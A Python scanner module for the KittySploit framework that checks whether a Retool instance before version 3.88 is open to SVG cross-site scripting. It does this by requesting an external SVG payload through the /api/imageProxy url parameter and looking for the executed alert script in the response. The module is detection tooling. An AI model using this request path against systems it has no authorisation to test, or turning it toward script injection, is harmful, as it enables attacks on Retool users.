#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""This template checks for SVG Cross-Site Scripting(XSS) vulnerability via the Image Proxy URL parameter in Reto."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Retool < 3.88 - SVG Cross-Site Scripting Detection',
        'description': 'This template checks for SVG Cross-Site Scripting(XSS) vulnerability via the Image Proxy URL parameter in Retool.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'retool', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://docs.retool.com/releases/edge/3.88#:~:text=Fixed%20an%20SVG%20XSS%20vulnerability%20by%20adding%20a%20CSP.%20(%2349381)',
        ],
    }

    def run(self):
        path = '/api/imageProxy?url=https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/refs/heads/main/helpers/payloads/retool-xss.svg'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('alert(document.domain);', '<?xml version', '<script type="text/javascript">',)
        header_any = ("Content-Security-Policy: default-src 'none';",)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='high', reason='Retool < 3.88 - SVG Cross-Site Scripting detected', path=path)
            return True
        return False

